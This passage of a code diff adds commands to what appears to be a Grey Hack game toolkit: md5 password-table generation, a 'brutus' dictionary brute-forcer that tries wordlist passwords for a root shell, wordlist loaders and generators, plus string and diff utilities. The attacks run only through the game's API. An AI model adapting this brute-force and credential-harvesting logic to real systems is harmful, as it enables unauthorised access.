+	self.s=[]
+	self.c={}
+	for s in samples
+		s=s.trim.upper
+		if s.len>3 then self.s.push(s) // length limiter here
+	end for
+	if DEBUG then print "pwgen: debug: self.s.len: "+self.s.len
+	for s in self.s
+		for i in range(0,s.len-4)
+		k=s[i:i+3] // limiter
+		if self.c.hasIndex(k) then
+			if self.c[k].indexOf(s[i+3])==null then self.c[k].push(s[i+3]) // limiter
+		else
+			self.c[k]=[s[i+3]] // limiter
+		end if
+		end for
+		//wait(.1)
+	end for
+	end function
+	PasswordGenerator.AllPasswords=function()
+	r={}
+	for s in self.s
+		for i in range(0,s.len-4)
+		self.r(s.len,s[i:i+3],r) // limiter
+		//wait(.01)
+		end for
+	end for
+		print(colorGold+"50%"+CT+" -- loading hash_table...")
+		print("<align=center>"+char(171)+char(187)+"</align>")
+	o={}
+	for s in r.indexes
+		if s.indexOf(" ")>=0 then
+		n=s.split(" ")
+		i=n.indexOf("")
+		while i>=0
+			n.remove(i)
+			i=n.indexOf("",i-1)
+		end while
+		if n then
+			for i in range(0,n.len-1)
+			n[i]=String.capitalize(n[i])
+			end for
+		end if
+		s=n.join(" ")
+		else
+		s=String.capitalize(s)
+		end if
+		if s.len<5 then continue
+		a=s[0]
+		b=s[1]
+		if a.lower==b or "hrl'aeiou".indexOf(b)==null and "AEIOUS".indexOf(a)==null and ["Ch","Mc"].indexOf(a+b)==null then s=String.capitalize(s[1:])
+		s=String.strip(s,"'-")
+		o[s]=1
+		o[s.lower]=1
+		//wait(.01)
+	end for
+	r={}
+	print(colorGold+"75%"+CT+" -- loading hash_table...")
+	print("<align=center>"+char(171)+char(187)+"</align>")
+	for p in o.indexes
+		if p.len > 3 then 
+			o[p[:4]] = 1
+			o[String.capitalize( p[:4] ) ] = 1
+			o[p[:3]] = 1
+			o[String.capitalize( p[:3] ) ] = 1
+		end if
+		if p.len > 4 then
+			o[p[-3:]] = 1
+			o[String.capitalize( p[-3:] )] = 1
+			o[p[-4:]] = 1
+			o[String.capitalize( p[-4:] )] = 1
+		end if
+	end for
+	for w in PASSWORDS
+		o[w] = 1
+	end for
+	if arg1 == "false" then return o.indexes
+	for i in o.indexes
+		r[md5(i)]=i
+	end for
+	return r
+	end function
+	PasswordGenerator.r=function(l,s,o)
+	c=s[s.len-3:]
+	if self.c.hasIndex(c) and s.len<l then
+		for c in self.c[c]
+		self.r(l,s+c,o)
+		//wait(.01)
+		end for
+	else
+		o[s]=1
+	end if
+	end function
+	if globals.BIGBRAIN then 
+		if arg1 == "false" then
+			return "Dictionary already expaneded."
+		end if
+		print(colorGold+"0% -- loading hash_table, please wait..."+CT)
+		HASH_TABLE = {}
+		for pw in globals.dict_a
+			HASH_TABLE[md5(pw)] = pw
+			//wait(.01)
+		end for
+		print(colorGold+"100%"+CT+" -- hash_table loaded...")
+	else
+		print(colorGold+"0% -- loading hash_table, please wait..."+CT)
+		if arg1 == "-t" or arg2 == "-t" then 
+			PasswordGenerator.init(PASSWORDSC)	
+		else 
+			PasswordGenerator.init(PASSWORDS)
+		end if
+		//PasswordGenerator.init(globals.dict_a)
+		//PasswordGenerator.init(globals.dict_a+PASSWORDS)
+		//PasswordGenerator.init(PASSWORDS[0:arg2])
+		//
+		print(colorGold+"10%"+CT+" -- loading hash_table...")
+		print("<align=center>"+char(171)+char(187)+"</align>")
+		HASH_TABLE=PasswordGenerator.AllPasswords
+		print(colorGold+"100%"+CT+" -- hash_table loaded...")
+		print("<b>Magnum Cerebrum: expanding onboard dictionary...</b>")
+		// globals.dict_a = HASH_TABLE.values
+		if arg2 == "-p" then globals.dict_a(HASH_TABLE.values + PASSWORDSA + PASSWORDSB + PASSWORDSC) else globals.dict_a(HASH_TABLE.values+PASSWORDS)
+		globals.BIGBRAIN = true
+		if arg1 == "false" then
+			return "Dictionary expaneded."
+		end if
+	end if
+	table = "tp"
+	if arg1 == "hash" then table = "t5"
+	print(print(colorGold+"Writing tables to <u>"+home_dir+"/tables/"+table+CT))
+	print(colorGold+"Hash Table: ["+colorWhite+HASH_TABLE.len+"</color>]")
+	print("<align=center>"+char(171)+char(187)+"</align>")
+	out=[]
+	count=0
+	lol=1
+	for i in HASH_TABLE
+		count=count+1
+		if arg1 == "hash" then
+			//out=out+char(10)+i["key"]+"="+i["value"]
+			out.push(i["key"]+"="+i["value"])
+		else
+			//out=out+char(10)+i["value"]
+			out.push(i["value"])
+		end if
+		output = out.join(char(10))
+		if output.len > 159900 then
+			print(lol+" "+out.len+" "+output.len)
+			localmachine.touch(home_dir+"/tables/"+table,lol+"")
+			file=localmachine.File(home_dir+"/tables/"+table+"/"+lol)
+			file.set_content(output)
+			command.perms("o-rwx",file)
+			out=[]
+			lol=lol + 1
+		end if
+		//wait(.01)
+	end for
+
+	if out.len > 1 then
+		print(lol+" "+HASH_TABLE.len+" "+out.len)
+		localmachine.touch(home_dir+"/tables/"+table,lol+"")
+		file=localmachine.File(home_dir+"/tables/"+table+"/"+lol)
+		file.set_content(out.join(char(10)))
+		command.perms("o-rwx",file)
+		out=""
+		lol=lol + 1
+	end if
+
+	return file.path
+end function
+command.brutus = function(arg1, arg2=0, arg3=0, arg4=0, arg5=0)
+	if arg1 == "-h" or arg1 == "help" then return colorGold+"Brutus: dictionary attack psudo brute force type tool"+char(10)+"Usage: brutus -- attempt to gain root pass and shell using onboard dict_a "+char(10)+"(Default onboard dict_a: ["+colorGold+globals.dict_a.len+CT+"] passwords)"+char(10)+"-- on success sends <b>shell</b> to BUFFER and password to <b>clipa</b>"+char(10)+"Usage: brutus -i [/path|object] -- import dictionary (may be csv or newline separated values)"+char(10)+"-- 5hell will attempt to determine the type. Please ensure valid inputs."+char(10)+"-- accepts: path to file or folder, or piped file/folder object"+char(10)+"-- See dfit for making a.csv from newline separated dictionary file."+char(10)+"-- See cerebrum for altering onboard dict_a"+char(10)+"Advanced: brutus -s [shell_object] [ip] -- use shell_object to initiate ssh + brutus attack against ip "+char(10)+"(equal to command.ssh root@-brutus [ip] but uses the given shell instead of active shell)"
+	dic = globals.dict_a
+	u_name = "root"
+	ip = ""
+	port = 22
+	b_remote = false
+	if arg1 == "-i" and arg1.len == 2 then
+	 	if arg2 and arg2 != "0" then
+			if typeof(arg2) == "string" then
+				dic = globals.get_file(arg2)
+			else
+				if typeof(arg2) == "file" then
+					dic = arg2
+				else
+					return "brutus: valid option -i [/path|file_object] -- import dictionary file"
+				end if
+			end if
+		else
+			return "brutus: valid option -i [/path|file_object] -- import dictionary file"
+		end if
+	end if
+	if DEBUG then print("arg1: "+arg1+char(10)+"arg2: "+arg2+char(10)+dic)
+	if not dic then return("Dictionary: "+arg2+" not found")
+	print(colorGold+"Brutus: accessing dictionary..."+CT)
+	if arg1 == "-s" and arg2 and typeof(arg2) == "shell" then
+		print(colorLightBlue+"brutus: </b>Configuring remote attack...<b>"+CT)
+		if arg3 and arg4 then
+			if arg5 then port = arg5
+			if typeof(port) != "number" then port = port.to_int
+			if typeof(port) != "number" then return colorRed+"brutus: invalid port"+CT
+			ip = arg4
+			u_name = arg3
+		else
+			if arg3 then u_name = arg3
+			ip = user_input("root@ip: ")
+		end if
+		if is_valid_ip(ip) then
+			print("<b>brutus: remote attack configured.</b>")
+			stop = user_input(colorRed+"WARNING:"+colorOrange+"Continuing will fill the terminal with ["+colorGold+globals.dict_a.len+colorOrange+"] connection attempts."+char(10)+" This cannot be avoided. Continue? [Y/n] "+CT)
+			if stop == "n" or stop == "N" then return "aborting..."
+			b_remote = true
+		else
+			return colorRed+"Brutus: invalid ip."+CT
+		end if
+	end if
+	if typeof(dic) == "file" then
+	 	if not dic.is_binary then
+			d_buf = dic.get_content
+			if d_buf.indexOf(",") > 0 then
+				dic = d_buf.trim.split(",")
+			else
+				dic = d_buf.split(char(10))
+			end if
+		else
+			if dic.is_folder then
+				df = dic.get_folders
+				box = []
+				for f in df
+					f_buf = f.get_content
+					if f_buf.indexOf(",") > 0 then
+						dic_buf = f_buf.trim.split(",")
+					else
+						dic_buf = f_buf.split(char(10))
+					end if
+					for d in dic_buf
+						box.push(d)
+					end for
+					//wait(.1)
+				end for
+				dic = box[0:]
+			else
+				return "brutus: invalid dictionary input."+char(10)+"got: binary_file. expected: folder or ascii file."
+			end if
+		end if
+	end if
+	if typeof(dic) != "list" then return "brutus: dictionary error."
+	if DEBUG then print("d_len: "+dic.len)
+	for d in dic
+		if b_remote then
+			root = shell.connect_service(ip, port, u_name, d)
+		else
+			root = get_shell("root", d)
+		end if
+		if typeof(root) == "shell" then
+			print("root:"+colorGold+""+d+""+CT)
+			print("clipa: "+command.clipa(d))
+			gotcha = root.host_computer.public_ip+":"+root.host_computer.local_ip
+			print "brutus: "+colorGreen+"saving root password as index in custom object. access via <b>cob</b> command"
+			if DEBUG then print("brutus: debug: calling cob: adding "+gotcha+" to index <b>"+d)
+			print command.cob("set",d,gotcha)
+			//print("brutus: writing to dump.txt")
+			//command.poke("dump.txt",char(10)+"root:"+d+char(10))
+			
+			globals.BUFFER.push(root)
+			print("<b>Shell sent to "+colorOrange+"BUFFER</color>."+char(10)+"-- access via Memory Alpha (<u>malp</u> command)</b>")
+			//go = user_input("Start terminal? [y/N]"+char(10)+"||: ",0,1)
+			//if go.lower == "y" then
+			//	root.start_terminal
+			//end if
+			return root
+		end if
+	end for
+	print("...brute force attack failed.")
+	return 0
+end function
+command.cerebrum = function(arg1, arg2, arg3=0, arg4=0)
+	if arg1 == "-h" or arg1 == "help" then return colorGold+"<u>Magnum Cerebrum || Big Brain || dictionary || word list || rockme</u>"+CT+char(10)+"Usage: cerebrum -- Expand dict_a to 300k+ passwords and store in custom_object.dictionary"+char(10)+"-- Use <b>pwgen</b> instead to save passwords locally to file."+char(10)+"<b>Advanced: cerebrum -i [/path/to/file|file_object|list] -- import a custom dictionary"+char(10)+"-- file may be csv or nsv: ',' or char(10) "+char(10)+"-- may be file, directory, piped object, or list"+char(10)+"Usage: <b>cerebrum --purge</b> -- purge the onboard dictionary (to save memory)."+char(10)+"Advanced: cerebrum -p -- load only common player passwords (wip)"+char(10)+"Advanced: cerebrum -i @home -- import dictionary file or folder from @home server"+char(10)+"-- searches /root/tables/tp on @home server"+char(10)+"-- see help @home for more information about the @home server."+char(10+"Advanced: -- passing -d as any argument returns the onboard dictionary as a list"+char(10)+"---- importing a string of passwords directly is not supported, use brutus for that."+char(10)+"Note: cerebrum will autodetect /root/tables and offer to import it if present")
+	if arg1 == "-i" and not arg2 then return "cerebrum: -i expects /path or file_object or @home."
+	infile = null
+	if arg1 == "--purge" then 
+		globals.dict_a(["a"])
+		globals.BIGBRAIN = false
+		return "cerebrum: dictionary purged."
+	end if
+	if arg1 == "-i"then
+		if not arg2 then return "crebrum: -i expects a path or file object or list."
+		if typeof(arg2) == "list" then
+			globals.dict_a(arg2)
+			if dict_a.len > 0 then return "cerebrum: ["+colorGold+globals.dict_a.len+CT+"] passwords ready. " else return "cerebrum: import error. dictionary corrupted."
+		end if
+		if typeof(arg2) == "string" then
+			if arg2 == "@home" then
+				r_ip = ""
+				r_p = "22"
+				if params and params.len > 1 then
+					r_ip = params[0]
+					r_p = params[1].to_int
+				else
+					r_ip = targ.ip
+					r_p = targ.pt
+				end if
+				if not is_valid_ip(r_ip) then return "cerebrum: set remote ip and port with command.target [ip] [port] before using -i @home option."
+				r_pas = ""
+				//if params and params.len > 2 then
+					//r_pas = params[2]
+				//else
+					r_pas = user_input("@home_server_password (leave blank to abort)"+char(10)+":> ", 1)
+				//end if
+				if r_pas.replace(" ","") == "" then return("aborting...")
+				r_r = shell.connect_service(r_ip, r_p, "root", r_pas)
+				if r_r and typeof(r_r) == "shell" then
+					infile = r_r.host_computer.File("/root/tables/tp")
+					if not infile then return (colorRed+"404: /root/tables/tp not found. Run pwgen on remote host."+CT)
+				else
+					return (colorRed+"222: remote server unreachable."+CT)
+				end if
+			else
+				infile = globals.get_file(arg2)
+				if DEBUG then print "infile: "+infile.path
+			end if
+		else
+			if typeof(arg2) == "file" then
+				infile = arg2
+			else
+				return "cerebrum: invalid type. expects /path or file_object or @home."
+			end if
+		end if
+		print(colorGold+"<size=75%>cerebrum: importing dictionary..."+char(10)+colorGold+"<align=center><size=75%><<>></align>"+CT)
+		if infile and not infile.is_binary then
+			d_b = infile.get_content
+			globals.dict_a([])
+			if d_b.indexOf(",") > 0 then
+				globals.dict_a(globals.dict_a + d_b.split(","))
+			else
+				globals.dict_a(globals.dict_a + d_b.split(char(10)))
+			end if
+		else
+			if infile and infile.is_folder then
+				globals.dict_a([])
+				for dfile in infile.get_files
+					if dfile.has_permission("r") and not dfile.is_binary then
+						d_b = dfile.get_content
+						if DEBUG then print "d_b input size: "+d_b.len
+						delim = ""
+						if d_b.indexOf(",") > 0 then
+							//globals.dict_a = globals.dict_a + dfile.get_content.split(",")
+							delim = ","
+						else
+							//globals.dict_a = globals.dict_a + dfile.get_content.split(char(10))
+							delim = char(10)
+						end if
+						if globals.dict_a.len < 710000 then 
+							d_b = d_b.split(delim)
+							globals.dict_a(globals.dict_a + d_b)	
+							if DEBUG then print("dict_a: "+dict_a.len)
+						else 
+							print("cerebrum: max dictionary length reached. Could not load: "+dfile.path)
+						end if
+					end if
+				end for
+			else
+				return "cerebrum: import error [411]."
+			end if
+		end if
+		if dict_a.len > 0 then 
+			globals.BIGBRAIN = true
+			return "cerebrum: ["+colorGold+dict_a.len+CT+"] passwords ready. " 
+		else 
+			return "cerebrum: import error. dictionary corrupted."
+		end if
+	end if
+	if globals.BIGBRAIN then return "Magnum Cerebrum already active."+char(10)+"Run the command: <b>cerebrum --purge</b> to reset."
+	print(colorGold+"<align=center> Magnum Cerebrum </align>"+CT)
+	print(colorGold+"- - - - - - - - - - - - - - - - - - - - - - - - - -"+CT)
+	//globals.BIGBRAIN = true
+	time_s = time
+	if DEBUG then print("DEBUG: TIME: "+time_s)
+	tab = get_shell.host_computer.File("/root/tables/tp")
+	if tab and tab.has_permission("r") then 
+		print("Detected /root/tables/tp. Auto-import passwords?")
+		autoimport = user_input("[Y/n/q]||: ",0,1)
+		if autoimport.lower == "q" then return
+		if autoimport.lower != "n" then 
+			print("Calling "+colorWhite+"<u>cerebrum -i /root/tables/tp</u>")
+			print command.cerebrum("-i","/root/tables/tp")
+			return globals.dict_a.len+" passwords imported in "+str(time-time_s)+" seconds."
+		end if
+	end if
+	if DEBUG then print("cerebrum calling: pwgen false "+arg1)
+	command.pwgen("false",arg1)
+	time_e = (time - time_s)
+	print( globals.dict_a.len+" passwords readied in "+time_e+" seconds." )
+	if arg1 == "-d" or arg2 == "-d" or arg3 == "-d" then return dict_a else return 0
+end function
+if DEBUG then print("<size=75%>loading jtr.5pk...(3.397kb)</size>")
+command.jtr = function(arg1,arg2,arg3,arg4=0)
+	if arg1 == "help" or arg1 == "-h" or not arg3 then return "John The Ripper password generator"+char(10)+"Usage: jtr [set_size] [word_length(1-15)] [opt:aAns] [opt:1]" + char(10) + "a - lowercase alpha" +char(10)+ "A - uppercase alpha"+char(10)+"n - numbers"+char(10)+"s - special characters"+char(10)+"note: at least ONE option must be selected"+char(10)+"1 -- optional only first letter is upper case (any value here is considered 1/true), leave blank for false."
+	if arg1.to_int <= 0 then return "size error: greater than zero expected"
+	if arg2.to_int <= 0 or arg2.to_int > 15 then return "length error: expected between 1 and 15"
+
+	array = []
+	alpha_l = range("a".code,"z".code)
+	i = 0
+	for c in alpha_l
+		alpha_l[i] = char(c)
+		i = i + 1
+	end for
+	alpha_u = range("A".code,"Z".code)
+	i = 0
+	for c in alpha_u
+		alpha_u[i] = char(c)
+		i = i + 1
+	end for
+	numbers = range(0,9)
+	special = ["!","@","#","$","%","^","&","*","(",")","-","+","=","}","{","[","]",";",":","<",">",",",".","'",""""]
+
+	SET_SIZE = arg1.to_int // generate 1000 words 
+	SET_RANGE = arg2.to_int // string of length 15
+	PARAMS = [0,0,0,0] // use alpha_l, use alpha_u, use numbers, use special
+	if arg3.indexOf("a") >= 0 then PARAMS[0] = 1
+	if arg3.indexOf("A") >= 0 then PARAMS[1] = 1
+	if arg3.indexOf("n") >= 0 then PARAMS[2] = 1
+	if arg3.indexOf("s") >= 0 then PARAMS[3] = 1
+	if PARAMS.indexOf(1) == null then return "option error: must select a, A, n, and/or s"
+
+	first_cap = 0
+	if arg4 then first_cap = 1
+	//print("arg4 is "+arg4+" and first_cap is "+ first_cap)
+	output = []
+	dupe_count = 0
+	time_out_limit = "1000000"
+
+	line = []
+	if PARAMS[0] then line = line + alpha_l
+	if PARAMS[1] then line = line + alpha_u
+	if PARAMS[2] then line = line + numbers
+	if PARAMS[3] then line = line + special
+	//print(line)
+	if typeof(line) != "list" then return "PARAMS error"
+	
+	print("<b>Generating wordlist...</b>")
+	loops = SET_SIZE
+	s1 = 10
+	s5 = 50
+	s7 = 75
+	while loops
+		i = 0
+		array = range( 0 , SET_RANGE - 1 )
+		while i < SET_RANGE
+			line.shuffle
+			if first_cap == true then 
+				if i == 0 then  
+					array[i] = line[0].upper
+				else
+					array[i] = line[0].lower
+				end if
+			else 
+				array[i] = line[0]
+			end if
+			i = i + 1
+			//wait(.01)
+		end while
+		if output.indexOf(array.join("")) == null then // ouput
+			output.push(array.join(""))
+			//loops = loops - 1
+		else 
+			array.shuffle
+			if output.indexOf(array.join("")) == null then 
+				output.push(array.join(""))
+			else 
+				dupe_count = dupe_count + 1
+				if dupe_count == time_out_limit.to_int then 
+					print "jtr: timeout limit reached: too many duplicates"+char(10)+"-- we managed to make: "+output.len+" passwords"
+					return output.join(char(10))
+				end if
+			end if
+		end if
+		loops = loops - 1
+		if DEBUG then print colorOrange+"output length: "+output.len
+		if SET_SIZE / loops == 10 then 
+			print(colorGold+"loading..."+(s1)+"% complete")
+			s1 = s1 + 1 
+		end if
+		if SET_SIZE / loops == 4 then 
+			print(colorGold+"loading... "+(s7)+"% complete")
+			s7 = s7 + 1
+		end if
+		if SET_SIZE / loops == 2 then 
+			print(colorGold+"loading... "+(s5)+"% complete")
+			s5 = s5 + 5
+		end if
+		//wait(.01)
+	end while
+	return output.join(char(10)) // max string size is 1 million chars
+end function
+command.string = function(arg1,arg2,arg3,arg4)
+	if arg1 == null or arg1 == "help" or arg1 == "-h" then return "String | To String | List | Join | replace"+char(10)+
+	colorGreen+"String and List functions (more to be added over time)."+char(10)+
+	"-- I didn't want to make a string command AND a list command so both are here."+char(10)+
+	colorWhite+"Lists: Stringifying lists:"+char(10)+
+	colorCyan+"Usage: string [opt] [list] -- converts a list to a string and returns it"+char(10)+
+	"-- use the clipboards and @a|@b|@c or piping to supply the list"+char(10)+
+	colorCyan+"Usage: string [lista] [listb] -- will return lista concatenated with listb"+char(10)+
+	"-- returns a <b>LIST</b>"+char(10)+
+	"-- pipe the resulting list back into string to stringify"+char(10)+
+	"-- e.g.: <b>string @a @b | string -n | poke new.txt</b>"+char(10)+
+	"-- I justify this as 'stringing two lists together' "+char(10)+char(10)+
+	"Option: -n -- join list with <color=red>char(10)"+char(10)+
+	"Option: -c -- join list with <color=blue>commas"+char(10)+
+	"Option: -C -- join list with <color=green>colons"+char(10)+
+	"Option: -s -- join list with <color=yellow>semicolons"+char(10)+
+	"Option: -S -- join list with <color=white>spaces"+char(10)+
+	"Note: the default join delimiter is char(10)"+char(10)+
+	"-- i.e: <b>string [list]</b> is the same as <b>string [-n] [list]"+char(10)+char(10)+
+	colorWhite+"Strings: Stringify strings:"+char(10)+
+	colorCyan+"Usage: string [-t] [target_text] -- returns trimmed text"+char(10)+
+	"-- ie: it removes whitespace"+char(10)+
+	colorCyan+"Usage: string [-p] [target_text] -- strip the noparse richtext tag from a string and return it"+char(10)+
+	colorCyan+"Usage: string [-r] [target_text] [replacement_text] [string_to_parse]"+char(10)+
+	"-- replace all instances of target_text with replacement_text within string_to_parse"+char(10)+
+	"-- use piping, easy clip, and "" text blocks "" to supply strings"+char(10)+
+	"-- use """""" in order to indicate a space (char(32))"+char(10)+
+	"-- use @nl to indicate a newline (char(10))"+char(10)+
+	"-- all params should be strings and the function returns the modified string"+char(10)+
+	colorCyan+"Usage: string [-R] -- as above but allows the use of miniscript supported regex"+char(10)+
+	colorWhite+"Numbers: Stringify numbers"+char(10)+
+	colorCyan+"Usage: string [number] -- returns str(number) as a string"+char(10)+
+	"-- please note that numbers are passed as numbers, not strings, when piped"+char(10)+
+	colorWhite+"Numberify strings:"+char(10)+
+	colorCyan+"Usage: string [-i] [string] -- converts a string to an integer and returns an integer"+char(10)+
+	"--eg:<b> string -i 100"+char(10)+
+	colorCyan+"Usage: string [-v] [string] -- converts a string to a floating point value and returns it"+char(10)+
+	"--eg:<b> string -v 3.12159"+char(10)+
+	colorWhite+"Listify strings"+char(10)+
+	colorCyan+"Usage: string [-l] [delim] [string] -- turn a string split at [delim] into a list"+char(10)+
+	"-- use floating quotes or piping to supply complex input strings"+char(10)+
+	"--eg:<b> string -l , one,two,three"+char(10)+
+	"--eg:<b> string -l , "" one, two, three, four "" "+char(10)+
+	colorCyan+"Usage: string [-L] [delim] [string] -- as above but applys .to_int to each element"+char(10)+
+	"-- ie: returns a list of integers"+char(10)+
+	"--eg:<b> string -L , 1,2,3,4"+char(10)+
+	"Note: maps are not yet supported"
+
+	_handle_replacement = function( target, replacement, in_string )
+		if not in_string isa string or not target isa string or not replacement isa string then return "replace: -r expects strings"
+		if replacement == """" then replacement = "" 
+		if target == """" then target = ""
+		if replacement == "@nl" then replacement = char(10) 
+		if target == "@nl" then target = char(10)
+		if use_regex == true then return in_string.replace_regex( target, replacement )
+		out_string = in_string.replace( target, replacement )	
+		return out_string
+	end function
+	_to_int = function( in_string )
+		if typeof(in_string) != "string" then return "string: expected string, got "+typeof(in_string)
+		return in_string.to_int
+	end function 
+	_to_val = function( in_string )
+		if typeof(in_string) != "string" then return "string: expected string, got "+typeof(in_string)
+		return in_string.val 
+	end function
+	_to_list = function( delim, in_string )
+		if not delim or typeof(delim) != "string" then return "string: delimiter must be a string"
+		if not in_string or typeof(in_string) != "string" then return "string: input string not supplied"
+		return in_string.split(delim)
+	end function
+	_to_int_list = function( delim, in_string )
+		if not delim or typeof(delim) != "string" then return "string: delimiter must be a string"
+		if not in_string or typeof(in_string) != "string" then return "string: input string not supplied"
+		s_a = in_string.split(delim)
+		s_b = []
+		for s in s_a 
+			s_b.push(s.to_int)
+		end for
+		return s_b
+	end function
+	_trim_input = function( instring )
+		if typeof( instring ) != "string" then return "string: expects [-t] [string_input]"
+		sp_str = instring.split(char(10))
+		output = []
+		for line in sp_str 
+			output.push(line.trim)
+		end for
+		return output.join(char(10)).trim
+	end function
+	_strip_input = function( instring )
+		if typeof( instring ) != "string" then return "string: expects [-p] [string_input]"
+		sp_str = instring.split(char(10))
+		output = []
+		for line in sp_str 
+			output.push(line.replace("<noparse>",""))
+		end for
+		return output.join(char(10)).trim
+	end function
+
+	delim = null
+	in_list = null
+	if typeof(arg1) == "number" then return str(arg1)
+	if typeof(arg1) == "list" and typeof(arg2) == "list" then 
+		print colorLightBlue+"Returning concatenated list..."
+		return arg1 + arg2
+	end if
+	if typeof(arg1) == "list" then in_list = arg1  
+	use_regex = false 
+	if arg1 == "-R" then
+		use_regex = true 
+		arg1 = "-r"
+	end if
+	if typeof(arg1) == "string" then 
+		if arg1 == "-p" then return _strip_input(arg2)
+		if arg1 == "-t" then return _trim_input( arg2 )
+		if arg1 == "-L" then return _to_int_list(arg2,arg3)
+		if arg1 == "-l" then return _to_list(arg2,arg3)
+		if arg1 == "-i" then return _to_int(arg2)
+		if arg1 == "-v" then return _to_val(arg2)
+		if arg1 == "-r" then return _handle_replacement(arg2,arg3,arg4)
+		if arg1 == "-n" then delim = char(10) // "/n"
+		if arg1 == "-c" then delim = char(44) // ","
+		if arg1 == "-C" then delim = char(58)   // ":"
+		if arg1 == "-s" then delim = char(59)   // ";"
+		if arg1 == "-S" then delim = " "   // i forgot the char code for spaces " "
+		if arg2 and typeof(arg2) == "list" then in_list = arg2 else return "string: 2nd param after flag should be a list" 
+		if not delim then return "string: invalid option. check usage."
+	end if
+	if not in_list then return "string: expects list"
+	if not delim then delim = char(10)
+	return in_list.join(delim)
+end function
+command.diff = function(input_1,input_2,arg3,arg4)
+
+    // the diff function
+    _diff = function(block_1, block_2,ret_type="string")
+		print colorRed+"--diff--"
+        if typeof(block_1) != "string" or typeof(block_2) != "string" then return "error: expected string string, got: "+typeof(block_1)+" and "+typeof(block_2)
+        diff_list = []
+		print_buffer = []
+        i = 0
+        j = 0
+        lines1 = block_1.split(char(10))
+        lines2 = block_2.split(char(10))
+		// if DEBUG then print "debug: len_1: "+lines1.len+" len_2: "+lines2.len
+		// if DEBUG then print "debug: in diff: trimming input"
+		// buf = []
+		// for line in lines1 
+		// 	if line != "" then buf.push(line.trim)
+		// end for
+		// lines1 = buf
+		// buf = []
+		// for line in lines2 
+		// 	if line != "" then buf.push(line.trim)
+		// end for
+		// lines2 = buf
+		leng1 = lines1.len 
+        leng2 = lines2.len 
+		if DEBUG then print "debug: len_1_1: "+lines1.len+" len_2_2: "+lines2.len
+        while i < leng1 or j < leng2 
+            if i < leng1 and j < leng2 then 
+				//if DEBUG then print "top of loop"
+                if lines1[i] == lines2[j] then 
+
+                    print_buffer.push((i+1)+"<color=#00ff88ff>"+char(177)+(j+1)+" "+lines1[i])
+					i = i + 1
+					j = j + 1
+                else 
+					print_buffer.push(colorRed+(i+1)+CT+"<color=#D9FF00ff>- "+lines1[i])
+                    print_buffer.push(colorRed+(j+1)+CT+"<color=#fc7324ff>+ "+lines2[j])
+					diff_list.push(i+1)
+					j = j + 1
+					if j < lines2.len then 
+						if lines1[i] != lines2[j] then i = i + 1// else diff_list.pop // this is a hack for compatibility with zero day stuff, make it better
+					else 
+						i = i + 1
+						if DEBUG then print "processed line "+ i
+					end if
+					//if lines2[j] != lines1[i] then j = j + 1
+					//i = i + 1
+            		
+                end if  
+            else 
+                if i < leng1 then 
+					if DEBUG then print "file_1 is longer by "+ (i-j)
+                    print_buffer.push("<color=#D9FF00ff>"+(i+1)+"- "+lines1[i])
+					if lines1[i] != "" then diff_list.push(i+1)
+                else 
+                    if j < leng2 then 
+						if DEBUG then print "file_2 is longer by "+(j-i)
+                        print_buffer.push("<color=#fc7324ff>"+(j+1)+"+ "+lines2[j])
+						if lines2[j] != "" then diff_list.push(j+1)
+                    end if
+               end if
+				i = i + 1
+            	j = j + 1
+            end if
+			//i = i + 1
+            //j = j + 1
+			//if DEBUG then print "bottom of loop"
+        end while
+        if ret_type == "string" then 
+			return print_buffer.join(char(10))
+		else 
+			print print_buffer.join(char(10))
+			return diff_list
+		end if
+    end function
+/////////////////////////////////////////START HERE///////////////////////////////////////////////////
+	// preprocess input
+	return_type = "string"
+	if input_1 == "-l" then 
+		return_type = "list"
+		input_1 = input_2 
+		input_2 = arg3 
+		arg3 = arg4
+	end if
+    // usage info
+    if not input_1 or not input_2 or input_1 == "-h" or input_1 == "help" then return "<u><b>DIFF || DIFFERENCES || FILE COMPARE || TEXT COMPARE"+char(10)+char(10)+
+    "Usage: diff [input_1] [input_2] -- standard diff tool"+char(10)+
+    "Usage: diff [file_1_path|file_1_object|text_block_1] [file_2_path|file_2_object|text_block_2]"+char(10)+
+    "-- compares <b>text</b> of input_1 to input_2 and prints output"+char(10)+
+    "-- prints differences when encountered"+char(10)+
+    "-- input_1 text is prepended with the <b>-</b> character"+char(10)+
+    "-- input_2 text is prepended with the <b>+</b> character"+char(10)+char(10)+
+    "Input notes:"+char(10)+
+    ":: if input_1 or input_2 are single words they are processed as <b>paths to a file"+char(10)+
+    ":: if input_2 or input_2 are more than one word (ie piped text) they are processed as strings"+char(10)+
+    ":: does not process binary files or lists"+char(10)+
+	":: -- for lists pipe the output of <b>string [yourlist]"+char(10)+
+	"Advanced: diff [-l] [input1] [input2] -- returns a list of ints corresponding to line numbers with differences"+char(10)+
+	"-- useful for <b>unit_testing</b> a debugLibrary"
+    // postprocess input
+    if typeof(input_1) == "string" then 
+        if input_1.split(" ").len == 1 then input_1 = globals.get_file(input_1)
+        if not input_1 then return "diff: "+input_1+" not found"
+    end if
+    if typeof(input_2) == "string" then 
+        if input_2.split(" ").len == 1 then input_2 = globals.get_file(input_2)
+        if not input_2 then return "diff: "+input_2+" not found"
+    end if 
+    if typeof(input_1) == "file" then 
+        if input_1.is_binary then return "diff: unable to open binary file: "+input_1.path
+        if not input_1.has_permission("r") then return "diff: unable to read "+input_1.path
+        input_1 = input_1.get_content
+    end if
+    if typeof(input_2) == "file" then 
+        if input_2.is_binary then return "diff: unable to open binary file: "+input_2.path        
+        if not input_2.has_permission("r") then return "diff: unable to read "+input_2.path
+        input_2 = input_2.get_content
+    end if
+	if DEBUG then print "debug: top of diff"
+	if DEBUG then print "debug: input_1: "+input_1
+	if DEBUG then print "<b>debug: input_1 leng: "+input_1.len
+	if DEBUG then print "debug: input_2: "+input_2 
+	if DEBUG then print "<b>debug: input_2 leng: "+input_2.len
+    return _diff(input_1,input_2,return_type)
+end function
+command["if"] = function(arg1,arg2,arg3,arg4)
+	if @arg1 == "help" or @arg1 == "-h" then return "IF || if statement || conditionals"+char(10)+
+	"Usage: if [positive_return] [negative_return] [condition_1] [condition_2] -- a binary if statement"+char(10)+
+	"-- compares condition_1 to condition_2"+char(10)+
+	"-- returns positive_return if equal"+char(10)+
+	"-- returns negative_return if not-equal"+char(10)+
+	"-- conditions and returns may be any data type"+char(10)+
+	"NOTE: functions as returns are returned by function reference"+char(10)+
+	"-- pipe to code for execution"+char(10)+
+	"-- functions as conditions are executed in place"+char(10)+
+	"---- it is not (currently) possible to pass parameters to these functions"+char(10)+
+	"NOTE: any parameter may be a command, with parameters, if:"+char(10)+
+	"-- the first word of the string is a command name"+char(10)+
